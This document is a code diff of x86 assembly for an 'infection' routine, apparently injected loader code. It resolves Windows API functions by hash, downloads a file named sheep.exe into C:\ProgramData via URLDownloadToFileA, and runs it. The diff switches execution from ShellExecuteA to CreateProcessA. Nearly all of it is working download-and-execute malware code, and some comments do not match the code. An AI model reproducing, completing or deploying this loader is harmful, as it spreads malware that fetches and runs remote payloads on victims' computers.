@@ -10,7 +10,7 @@ global main
 main:
    push ebp
    mov ebp,esp
-   sub esp,4
+   sub esp,0x58
    push esi
    push edi
    push ebx
@@ -25,8 +25,6 @@ main:
 infection__data__start:         ; this prevents relocations from forming because we are not
 infection__data__urlmon:        ; using absolute addresses for our data, making it more portable
    db "urlmon.dll",0
-infection__data__shell32:
-   db "shell32.dll",0
 infection__data__sheep:
    db "C:\\ProgramData\\sheep.exe",0
 infection__data__download_url:
@@ -46,6 +44,10 @@ infection__data:
    push esi
    call get_proc_by_hash        ; get_proc_by_hash(kernel32_module, 0x53b2070f)
    mov edi, eax                 ; get function for LoadLibraryA
+   push 0x4a7c0a09
+   push esi
+   call get_proc_by_hash        ; get_proc_by_hash(shell32_module, 0xb0ff5bf)
+   mov [ebp-4], eax             ; get function for CreateProcessA
    push 0xda1a7563
    push esi
    call get_proc_by_hash        ; get_proc_by_hash(kernel32_module, 0xda1a7563)
@@ -53,17 +55,11 @@ infection__data:
    lea eax, [ebx+(infection__data__urlmon-infection__data__start)] ; urlmon.dll
    push eax
    call edi                                                        ; LoadLibraryA("urlmon.dll")
+   mov edi,[ebp-4]                                                 ; replace edi with CreateProcessA
    push 0xd8d746fc
    push eax
    call get_proc_by_hash        ; get_proc_by_hash(urlmon_module, 0xd8d746fc)
    mov [ebp-4], eax             ; get function for URLDownloadToFileA
-   lea eax, [ebx+(infection__data__shell32-infection__data__start)] ; shell32.dll
-   push eax
-   call edi                                                         ; LoadLibraryA("shell32.dll")
-   push 0xb0ff5bf
-   push eax
-   call get_proc_by_hash        ; get_proc_by_hash(shell32_module, 0xb0ff5bf)
-   mov edi, eax                 ; get function for ShellExecuteA
    lea eax, [ebx+(infection__data__sheep-infection__data__start)] ; C:\ProgramData\sheep.exe
    push eax
    call esi                                                       ; GetFileAttributesA("C:\\ProgramData\\sheep.exe")
@@ -82,21 +78,33 @@ infection__data:
    jnz infection__end           ; URLDownloadToFileA returning nonzero is an error
 
 infection__payload_exists:
-   push 1
+   lea eax, [ebp-0x58]
+   push eax
+   lea eax, [ebp-0x48]
+   push eax
+   mov [ebp-0x48], 0x44
+   push 0
+   push 0
+   push 0
+   push 0
    push 0
    push 0
    lea eax, [ebx+(infection__data__sheep-infection__data__start)]
    push eax
    push 0
-   push 0
-   call edi                     ; ShellExecuteA(nullptr, nullptr, "C:\\ProgramData\\sheep.exe", nullptr, nullptr, 1)
-   add esp,0x18                 ; it's apparently cdecl
+   xorps xmm0,xmm0
+   movups [ebp-0x58],xmm0
+   movups [ebp-0x44],xmm0
+   movups [ebp-0x34],xmm0
+   movups [ebp-0x24],xmm0
+   movups [ebp-0x14],xmm0
+   call edi                     ; CreateProcessA(NULL, "sheep.exe", NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &proc_info)
    
 infection__end:
    pop ebx
    pop edi
    pop esi
-   add esp,4
+   add esp,0x58
    pop ebp
 
 %ifdef TLS
